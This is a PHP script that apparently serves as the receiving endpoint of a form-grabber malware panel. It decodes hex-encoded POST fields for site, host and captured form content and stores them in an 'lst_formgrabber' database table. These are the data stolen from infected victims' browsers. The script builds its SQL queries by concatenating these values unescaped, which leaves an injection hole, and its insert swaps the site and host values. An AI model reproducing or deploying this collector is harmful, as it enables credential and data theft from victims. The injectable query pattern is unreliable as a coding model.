<?php
include("../../inc/config.php");
include("../../inc/funcs.php");
include("../../geoip.inc");

function hexToStr($hex)
{
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}

if (isset($_POST['mode']))
{
    if ($_POST['mode'] == 1) {
        $content = hexToStr(dRead("content"));
        $sql = "SELECT `ID` FROM `lst_formgrabber` WHERE `content` = '".$content."';";
        $res = mysql_query($sql);
        if (mysql_num_rows($res) < 1) {
            $site = hexToStr(dRead("site"));
            $host = hexToStr(dRead("host"));
            $sql = "INSERT INTO `lst_formgrabber` (`ID`, `site`, `host`, `content`) VALUES (NULL, '".$host."','".$site."','".$content."');";
            mysql_query($sql);
        }
    }
}		
die("");
?>
